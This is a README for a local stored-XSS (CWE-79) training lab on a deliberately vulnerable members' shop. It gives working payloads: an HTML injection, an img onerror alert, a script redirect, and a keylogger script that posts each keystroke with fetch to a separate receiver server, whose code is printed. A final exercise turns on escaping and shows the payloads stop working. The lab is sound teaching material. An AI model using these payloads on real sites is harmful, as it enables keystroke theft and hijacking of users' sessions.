# Stored XSS

Member shop on port **3002**. The vulnerable feature is an opinion under *Gone with the Wind* on `/members`. The note is saved and written into the page for the next signed-in reader (CWE-79).

- **Port:** `3002`
- **Accounts:** `marc` / `marc123`, `ewa` / `ewa123` (admin)
- **Stack:** Express + TypeScript, in-memory SQLite (`server/sql/init.sql`). Restarting `npm run dev` clears sessions, purchases, and opinions.

## Run

```bash
cd server
npm install
npm run dev
```

Open **`http://localhost:3002/login`**.

## Layout

```text
XSS/
  README.md
  server/
    src/comments.ts           # USE_SAFE_HTML; stored opinions inserted into the page
    src/routes/members.ts     # GET /members, POST /comments, POST /buy
    pages/members.html        # opinion form, <!-- COMMENTS -->
```

| Request | Meaning |
|---------|---------|
| `POST /comments` | Save the signed-in login and `body`, then redirect to `/members` |
| `GET /members` | Library page; opinions are inserted into the HTML |

`USE_SAFE_HTML` in [`server/src/comments.ts`](server/src/comments.ts) controls whether that text is escaped.

## Prerequisite

**CWE-79** (Improper Neutralization of Input During Web Page Generation).

The session cookie is `HttpOnly`, same as the shop. One browser holds one session, so the other account is a sign-out, not a second tab.

Sign in as `marc` / `marc123`. On `/members`, post `świetna książka`.

Sign out. Sign in as `ewa` / `ewa123`. The same sentence is on `/members`, under **marc**. It was stored, not carried only in the URL.

## Exercises

### 1. HTML

Sign in as `marc`. In **Opinion**, submit:

```html
<b>tu jest HTML</b>
```

Sign in as `ewa`. The words are bold. The server pasted `body` into the HTML instead of showing the angle brackets.

### 2. A script for the next reader

Sign in as `marc`. In **Opinion**, submit:

```html
<img src=x onerror=alert(document.domain)>
```

Sign in as `ewa`. The alert runs when `/members` loads. The script runs as this origin (`localhost:3002`).

**Debrief:** `alert(document.cookie)` does not show `session`. This shop's cookie is `HttpOnly`, as in the [Cookies](../Cookies/) lab, so page script cannot read it. The script on this page still runs. HttpOnly limits what the script can see. It does not stop the script.

### 3. Redirect the next reader

Sign in as `marc`. In **Opinion**, submit:

```html
<script>
document.location = "https://www.google.com/";
</script>
```

Sign out. Sign in as `ewa`. Opening `/members` leaves the shop. The address bar is `https://www.google.com/`.

### 4. Keys sent to another server

Restart the shop (`npm run dev`) so the redirect from exercise 3 is gone.

In a second terminal, start a receiver on port **4000** (not the shop). It needs Express and `"type": "module"`:

```js
import express from "express";

const app = express();

app.post("/key", express.text(), (req, res) => {
  if (typeof req.body === "string" && req.body !== "") console.log(req.body);
  res.end();
});

app.listen(4000);
```

Sign in as `marc`. In **Opinion**, submit:

```html
<script>
document.onkeypress = function (e) {
  fetch("http://localhost:4000/key", { method: "POST", body: e.key });
};
</script>
```

Sign out. Sign in as `ewa`. Click **Opinion** and type `ewa`.

The receiver prints `e`, then `w`, then `a`. The shop does not receive those letters. The stored opinion sends them with `POST /key`.

### 5. Enable the escape (uncomment)

At the top of [`server/src/comments.ts`](server/src/comments.ts), find `USE_SAFE_HTML`:

1. Comment out: `const USE_SAFE_HTML = false;`
2. Uncomment: `// const USE_SAFE_HTML = true;`
3. Restart `npm run dev` (in-memory opinions are cleared).

Repeat exercise **2**, **3**, or **4**. Expected: the payload is visible as text. There is no alert, `/members` stays on port **3002**, and the receiver prints no keys. The prerequisite sentence still shows as plain text.

The escape replaces `&`, `<`, `>`, and `"` in the login and the opinion.
